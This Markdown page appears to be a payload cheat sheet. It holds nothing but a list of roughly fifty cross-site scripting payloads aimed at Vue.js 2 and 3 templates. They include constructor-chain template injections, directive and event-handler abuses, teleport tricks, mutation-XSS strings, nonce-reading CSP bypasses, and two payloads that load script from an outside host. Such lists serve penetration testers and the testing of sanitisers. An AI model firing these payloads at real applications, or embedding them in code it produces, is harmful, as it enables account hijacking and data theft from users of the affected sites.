# Vue.js XSS (Cross-Site Scripting)

## XSS Payload List for Vue.js (v2 & v3):
```
<x is=script src=//⑭.₨>
<svg@load=this.alert(1)>
{{_b.constructor`alert(1)`()}}
<img src @error=this.alert(1)>
<xyz<img/src onerror=alert(1)>>
{{_c.constructor('alert(1)')()}}
{{_c.constructor('alert(1)')()}}
<p :=_c.constructor`alert(1)`()>
{{_s.constructor('alert(1)')()}}
{{_v.constructor('alert(1)')()}}
{{$emit.constructor`alert(1)`()}}
<p v-=_c.constructor`alert(1)`()>
<x :[_b.constructor`alert(1)`()]>
<x :[_b.constructor`alert(1)`()]>
<x @[_b.constructor`alert(1)`()]>
<x @[_b.constructor`alert(1)`()]>
<x #[_c.constructor`alert(1)`()]>
<x #[_c.constructor`alert(1)`()]>
{{_Vue.h.constructor`alert(1)`()}}
<component is=script text=alert(1)>
<x v-if=_c.constructor('alert(1)')()>
<p v-show="_c.constructor`alert(1)`()">
<x v-html=_c.constructor('alert(1)')()>
{{_openBlock.constructor('alert(1)')()}}
<x @click=$event.view.alert(1)>click</x>
<x v-bind:is="'script'" src="//14.rs" />
{{constructor.constructor('alert(1)')()}}
<x @[_openBlock.constructor`alert(1)`()]>
<x v-bind:a='_b.constructor`alert(1)`()'>
{{$el.ownerDocument.defaultView.alert(1)}}
{{_createBlock.constructor('alert(1)')()}}
{{_createVNode.constructor('alert(1)')()}}
<x @[_capitalize.constructor`alert(1)`()]>
<img src @error=e=$event.path.pop().alert(1)>
{{_toDisplayString.constructor('alert(1)')()}}
<p v-show=_createBlock.constructor`alert(1)`()>
<x @click='_b.constructor`alert(1)`()'>click</x>
<x @click=_withCtx.constructor`alert(1)`()>click</x>
<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">
<x v-on:click='_b.constructor`alert(1)`()'>click</x>
<img src @error=e=$event.composedPath().pop().alert(1)>
{{$el.innerHTML='\u003cimg src onerror=alert(1)\u003e'}}
{{_c.constructor`alert(document.currentScript.nonce)`()}} 
<a @['c\lic\u{6b}']="_c.constructor('alert(1)')()">test</a>
{{_Vue.h.constructor`alert(document.currentScript.nonce)`()}}
<div v-html="''.constructor.constructor('alert(1)')()">a</div>
<p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//">
<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;">
<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>
<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>
<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>
```
